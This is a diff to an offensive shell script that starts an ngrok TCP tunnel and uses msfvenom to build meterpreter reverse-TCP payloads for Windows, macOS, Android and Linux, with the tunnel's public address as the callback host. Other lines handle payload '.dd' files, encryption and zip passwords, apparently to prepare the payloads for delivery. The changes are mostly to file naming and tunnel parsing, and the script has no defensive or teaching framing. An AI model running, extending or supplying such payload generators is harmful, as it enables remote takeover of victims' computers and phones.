@@ -1,6 +1,10 @@
 #!/bin/sh
 TEMPFILE=$HOME/msf/tmp/.temp_ip_ngrok-tcp.txt
-FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g")
+if [ $uname = "Linux" ]; then
+	FILE=reverse-$(cat $TEMPFILE |sed "s#:#-port#g")
+else
+	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g")
+fi
 #PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
 PORT=5656
 IP=$(cat $TEMPFILE | sed 's/\:.*//')
@@ -15,6 +19,11 @@ DDFILEENCRYPTED="$HOME/msf/dd/payload_sample_encrypted.dd"
 OLDLINK=$(cat ~/msf/tmp/old_link.txt)
 NEWLINK=$(cat ~/msf/tmp/new_link.txt)
 catngrok=$(cat $TEMPFILE)
+#FOLDER_USEFUL="storage/emulated/0/utiles/payload.dd"
+FOLDER_USEFUL="/root/msf/utiles"
+
+
+
 touch $TEMPFILE
 
 echo "\033[1;32m____    ____  ___       __  ___      ___      .__   __.  _______   __  
@@ -67,9 +76,16 @@ if [ -z $(grep '[^[:space:]]' $TEMPFILE) ]; then
 	echo "\033[1;32m \nNGROK SERVER FAILED TO START..\nEXITING...\033[0m"
 	exit
 fi
-
-echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
+#macos check
+#echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
+#linux check
+echo "$(curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url )" > $TEMPFILE
 echo "The file\033[1;32m .temp_ip_ngrok-tcp.txt \033[0m has been created to store the IP & PORT address of your ngrok server"
+
+name_linux="$(date +%Y_%m_%d_%HH%M)-$(cat $TEMPFILE |sed "s#:#-port#g")"
+FILE=reverse-$name_linux
+
+
 sleep 1
 echo "\033[1;32m \nPayload Options:\033[0m"
 sleep 1
@@ -93,18 +109,21 @@ read payload_choice
 if [ $payload_choice = "w" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
 	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f exe > $TEMP/$FILE.exe
+	FILE="reverse-$name_linux.exe"
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose Windows EXE format::::\033[0m"
 fi
 if [ $payload_choice = "m" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
 	msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f osx-app > $TEMP/$FILE.app
+	FILE="reverse-$name_linux.app"
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose MacOSX APP format::::\033[0m"
 fi
 if [ $payload_choice = "a" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
 	msfvenom -p android/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > $TEMP/$FILE.apk
+	FILE="reverse-$name_linux.apk"
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose Android APK Format::::\033[0m"
 fi
@@ -112,6 +131,7 @@ fi
 if [ $payload_choice = "l" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
 	msfvenom -p linux/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > $TEMP/$FILE.sh
+	FILE="reverse-$name_linux.sh"
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose Linux APK Format::::\033[0m"
 fi
@@ -122,24 +142,6 @@ if [ $payload_choice != "a" ] && [ $payload_choice != "m" ] && [ $payload_choice
 	exit
 fi
 
-#changing filename for m, w or a
-
-if [ $payload_choice = "w" ]; then
-	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").exe
-fi
-if [ $payload_choice = "m" ]; then
-	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").app
-fi
-if [ $payload_choice = "a" ]; then
-	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").apk
-fi
-if [ $payload_choice = "l" ]; then
-	FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").sh
-fi
-
-
-#FOLDER_USEFUL="storage/emulated/0/utiles/payload.dd"
-FOLDER_USEFUL="/root/msf/utiles"
 
 
 
@@ -175,7 +177,7 @@ fi
 
 #Needs to check if Windows unzip.exe in tmp folder as the right parameters in the dd file
 #
-if [ $password = "" ]; then
+if [ $password_zip = "" ]; then
 	continue
 else
 	echo "::::The .dd file is creating .."
